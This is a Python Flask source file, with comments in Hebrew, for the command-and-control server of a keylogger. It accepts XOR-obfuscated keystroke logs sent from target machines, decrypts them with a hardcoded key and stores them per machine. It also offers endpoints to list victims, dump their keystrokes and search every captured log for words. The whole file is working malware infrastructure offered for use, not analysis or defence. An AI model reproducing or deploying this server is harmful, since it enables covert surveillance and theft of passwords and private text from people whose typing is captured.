# -*- coding: utf-8 -*-

from flask import Flask, jsonify, request
from flask_cors import CORS
import os
import time
import codecs


app = Flask(__name__)
CORS(app)
# הגדרת נתיב תיקיית הנתונים
DATA_FOLDER = "data"

# הגדרת המפתח הסודי לפענוח
# הערה: ביישום אמיתי, מפתח זה צריך להיות מאוחסן בצורה מאובטחת יותר.
SECRET_KEY = "avi"


def xor_decrypt_bytes(data: bytes, key: str) -> bytes:
    """פענוח XOR על רצף בייטים"""
    key_bytes = key.encode("utf-8")
    decrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
    return decrypted


@app.route('/')
def home():
    return "KeyLogger Server is Running"


@app.route('/api/save_data', methods=['POST'])
def save_data():
    """
    מקבל נתונים מוצפנים מהקיילוגר, מפענח אותם ושומר בקובץ.
    """
    data = request.get_json()
    if not data or "machine_name" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine_name"]
    encrypted_hex_data = data["data"]

    # --- שלב הפענוח החדש ---
    try:
        # 1. המרת מחרוזת Hex לבייטים
        encrypted_data_bytes = codecs.decode(encrypted_hex_data.encode("utf-8"), 'hex')

        # 2. פענוח הבייטים באמצעות פונקציית XOR
        decrypted_data_bytes = (xor_decrypt_bytes(encrypted_data_bytes, SECRET_KEY))

        # 3. המרת הבייטים המפוענחים בחזרה למחרוזת טקסט קריאה
        log_data = decrypted_data_bytes.decode("utf-8", errors="ignore")
        print(log_data)
    except Exception as e:
        # טיפול בשגיאה אם הפענוח נכשל
        return jsonify({"error": f"Decryption failed: {str(e)}"}), 500

    # יצירת תיקייה למכונה אם היא לא קיימת
    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    # שימוש בשם קובץ קבוע לכל מכונה המבוסס על התאריך
    date_str = time.strftime("%Y-%m-%d")
    filename = f"log_{date_str}.txt"
    file_path = os.path.join(machine_folder, filename)

    # הוספת חותמת זמן ושורה חדשה לכל שליחה
    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]")
    line_to_write = f"{timestamp} - {log_data}\n"

    # פתיחת הקובץ במצב הוספה ('a'). אם הקובץ לא קיים הוא יווצר
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(line_to_write)

    return jsonify({"status": "success", "file": file_path}), 200
# --------------------------
# רשימת כל המכשירים
# --------------------------
@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    if not os.path.exists(DATA_FOLDER):
        return jsonify([])
    machines = [d for d in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, d))]
    return jsonify(machines)

# --------------------------
# שליפת כל הקלדות (keystrokes) עבור מכשיר מסוים
# --------------------------
@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    target_machine = request.args.get('machine')
    if not target_machine:
        return jsonify({"error": "Missing 'machine' parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": f"Machine '{target_machine}' not found"}), 404

    keystrokes = []
    for filename in os.listdir(machine_folder):
        file_path = os.path.join(machine_folder, filename)
        if os.path.isfile(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                keystrokes.extend(f.readlines())

    # מחזיר JSON עם כל השורות (אפשר גם להוסיף תאריך/קובץ אם רוצים)
    return jsonify({"machine": target_machine, "keystrokes": keystrokes})
# --------------------------
# שליפת תוכן של קובץ ספציפי עבור מכונה מסוימת
# --------------------------
@app.route('/api/file/<machine>/<filename>', methods=['GET'])
def get_file_content(machine, filename):
    file_path = os.path.join(DATA_FOLDER, machine, filename)

    if not os.path.exists(file_path):
        return jsonify({"error": "File not found"}), 404

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    # --------------------------
    # חיפוש מילה בכל קבצי הנתונים
    # --------------------------
@app.route('/api/search', methods=['GET'])
def search_keystrokes():
        search_word = request.args.get('word', '').strip()
        if not search_word:
            return jsonify([])

        results = []
        if os.path.exists(DATA_FOLDER):
            # עובר על כל תיקייה (מכונה)
            for machine in os.listdir(DATA_FOLDER):
                machine_folder = os.path.join(DATA_FOLDER, machine)
                if os.path.isdir(machine_folder):
                    # עובר על כל קובץ בתוך תיקיית המכונה
                    for filename in os.listdir(machine_folder):
                        file_path = os.path.join(machine_folder, filename)
                        if os.path.isfile(file_path) and filename.endswith(".txt"):
                            try:
                                with open(file_path, 'r', encoding='utf-8') as f:
                                    # קורא כל שורה בקובץ
                                    for line in f:
                                        if search_word in line:
                                            # מוסיף תוצאה לרשימה אם נמצאה התאמה
                                            results.append({
                                                "machine": machine,
                                                "file": filename,
                                                "line": line.strip()
                                            })
                            except Exception:
                                # מתעלם מקבצים שאי אפשר לקרוא
                                continue
        return jsonify(results)
# --------------------------
# שליפת רשימת קבצים עבור מכשיר מסוים
# --------------------------
@app.route('/api/get_files_list', methods=['GET'])
def get_files_list():
    target_machine = request.args.get('machine')
    if not target_machine:
        return jsonify({"error": "Missing 'machine' parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, target_machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": f"Machine '{target_machine}' not found"}), 404

    files = [f for f in os.listdir(machine_folder) if os.path.isfile(os.path.join(machine_folder, f))]
    return jsonify(files)
if __name__ == '__main__':
    # יצירת תיקיית הנתונים אם היא לא קיימת בעת הפעלת השרת
    if not os.path.exists(DATA_FOLDER):
        os.makedirs(DATA_FOLDER)
    app.run( debug=True)
